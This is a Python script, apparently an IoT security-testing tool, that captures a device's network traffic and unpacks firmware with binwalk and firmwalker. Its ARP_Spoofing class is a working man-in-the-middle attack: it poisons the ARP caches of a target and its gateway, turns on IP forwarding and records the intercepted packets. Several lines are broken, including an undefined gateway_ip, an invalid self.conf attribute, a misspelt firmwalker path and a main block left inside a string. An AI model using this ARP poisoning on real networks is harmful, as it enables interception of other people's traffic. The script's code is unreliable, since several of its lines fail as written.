import pyshark, subprocess, os, sys, signal
from scapy.all import *

# --------------------------------------------
#   DEVICE BOOTING UP | PACKET CAPTURING
# --------------------------------------------
def capture_device_boot(device_ip):
    print('\n\t[*] Intializing Device Bootup Mode..............!')
    timeout = int(input('\t[?] Provide Time frame to capture (in secs) : '))
    path = input('\t[?] Provide Path to Store pcap File : ')
    check = input('\t[?] Do you want to Continue [Y/N] : ')
    while True:
        if check in ['y', 'Y']:
            try:
                capture = pyshark.LiveCapture(output_file=path, bpf_filter=f'host {device_ip}')
                capture.sniff(timeout=timeout)
                if len(capture) > 0:
                    print(f'\t[+] {capture}')
                    print(f'\t[+] Pcap file Created Successfully at Path : {path}')
                elif len(capture) == 0: print('\t[-] Unable to Create Pcap File | Reason 0 packets')
            except Exception as e: print(f'\t[-] Unable to Capture the Data, Reason -> {e}')
            break
        elif check in ['n', 'N']: break
        else: print('\t[-] Invalid Selection, Please Try Again!')

# ---------------------------------------------------------------------------
#   CAPTURE COMMUNICATION PACKETS BETWEEN DEVICE AND MOBILE APPLICATION
# ---------------------------------------------------------------------------
class ARP_Spoofing:

    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.gateway_ip = input('\t[?] Provide Gateway IPAddress')
        self.packet_count = 10000
        self.conf.iface = "eth0"

    def get_mac(self, ip_address):
        # ARP request is constructed. sr function is used to send/ receive a layer 3 packet
        # Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
        resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
        for s, r in resp:
            return r[ARP].hwsrc
        return None

    def restore_network(self, gateway_ip, gateway_mac, target_ip, target_mac):
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
        send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
        print("\t[*] Disabling IP forwarding")
        # Disable IP Forwarding on a mac
        os.system("sysctl -w net.inet.ip.forwarding=0")
        # kill process on a mac
        os.kill(os.getpid(), signal.SIGTERM)

    def arp_poison(self, gateway_ip, gateway_mac, target_ip, target_mac):
        print("\t[*] Started ARP poison attack [CTRL-C to stop]")
        try:
            while True:
                send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
                send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
                time.sleep(2)
        except KeyboardInterrupt:
            print("\t[*] Stopped ARP poison attack. Restoring network")
            self.restore_network(gateway_ip, gateway_mac, target_ip, target_mac)


    def capture_mobile_app_communication(self):
        print("\t[*] Starting script: arp_poison.py")
        print("\t[*] Enabling IP forwarding")
        os.system("echo \"1\" > /proc/sys/net/ipv4/ip_forward")
        # os.system("sysctl -w net.inet.ip.forwarding=1")
        print(f"\t[*] Gateway IP address: {gateway_ip}")
        print(f"\t[*] Target IP address: {self.target_ip}")
        gateway_mac = self.get_mac(self.gateway_ip)
        if gateway_mac is None:
            print("\t[!] Unable to get gateway MAC address. Exiting..")
            sys.exit(0)
        else: print(f"\t[*] Gateway MAC address: {gateway_mac}")
        target_mac = self.get_mac(self.target_ip)
        if target_mac is None:
            print("\t[!] Unable to get target MAC address. Exiting..")
            sys.exit(0)
        else: print(f"\t[*] Target MAC address: {target_mac}")
        try:
            sniff_filter = "ip host " + self.target_ip
            print(f"\t[*] Starting network capture. Packet Count: {self.packet_count}. Filter: {sniff_filter}")
            packets = sniff(filter=sniff_filter, iface=self.conf.iface, count=self.packet_count)
            wrpcap(self.target_ip + "_capture.pcap", packets)
            print(f"\t[*] Stopping network capture..Restoring network")
            self.restore_network(self.gateway_ip, gateway_mac, self.target_ip, target_mac)
        except KeyboardInterrupt:
            print(f"\t[*] Stopping network capture..Restoring network")
            self.restore_network(self.gateway_ip, gateway_mac, self.target_ip, target_mac)
            sys.exit(0)


# ----------------------------------
#   CAPTURE FIRMWARE PACKETS
# ----------------------------------
def capture_firmware():
    path = input('\t[?] Provide the Path to Save : ')
    try:
        print('\t[+] Initializing Firmware..................!')
        subprocess.call(f'tshark -i wlps10 -w {path} -F libpcap')
        print(f'\t[+] Pcap File Created | Path : {path}')
        os.system('unzip destdir/*.zip')
        os.system('binwalk -e *.img')
        for i in os.listdir('.'):
            if 'extracted' in i: folder = i
        os.system(f'cd frimwalker/ && ./firmwalker.sh/ ../{folder}/squashfs-root/')
    except Exception as e: print(f'\t[-] Unable to Create Pcap File | Reason -> {e}')

# ----------------------------------
#   CAPTURE OFFLINE DEVICE PACKETS
# ----------------------------------
def capture_offline(device_ip):
    print('\t[+] Initializing Offline Mode Packet Capturing................!')
    timeout = int(input('\t[?] Provide Time frame to capture (in secs) : '))
    path = input('\t[?] Provide Path to Store pcap File : ')
    check = input('\t[?] Do you want to Continue [Y/N] : ')
    while True:
        if check in ['y', 'Y']:
            try:
                capture = pyshark.LiveCapture(output_file=path, bpf_filter=f'host {device_ip}')
                capture.sniff(timeout=timeout)
                if len(capture) > 0:
                    print(f'\t[+] {capture}')
                    print(f'\t[+] Pcap file Created Successfully at Path : {path}')
                elif len(capture) == 0: print('\t[-] Unable to Create Pcap File | Reason 0 packets')
            except Exception as e: print(f'\t[-] Unable to Capture the Data, Reason -> {e}')
            break
        elif check in ['n', 'N']: break
        else: print('\t[-] Invalid Selection, Please Try Again!')

'''
if __name__ == '__main__':
    device_ip = input('[?] Provide Device IPAddress : ')
    while True:
        print('[1] Booting Device\n[2] Mobile Application Interaction\n[3] Firmware mode\n[4] Offline mode')
        while True:
            choice = input('[?] Enter Your Choice : ')
            if choice not in ['1', '2', '3', '4']: print('[-] Invalid Selection, Please Select Again!')
            else: break
        if choice == '1': capture_device_boot(device_ip)
        elif choice == '2':
            a = ARP_Spoofing(device_ip)
            a.capture_mobile_app_communication()
        elif choice == '3': capture_firmware()
        elif choice == '4': capture_offline(device_ip)
        check = input('\n[?] Do You Want to Continue [Y/N] : ')
        if check in ['y', 'Y']: continue
        else: break
    print('[!] Exit!!')
 '''
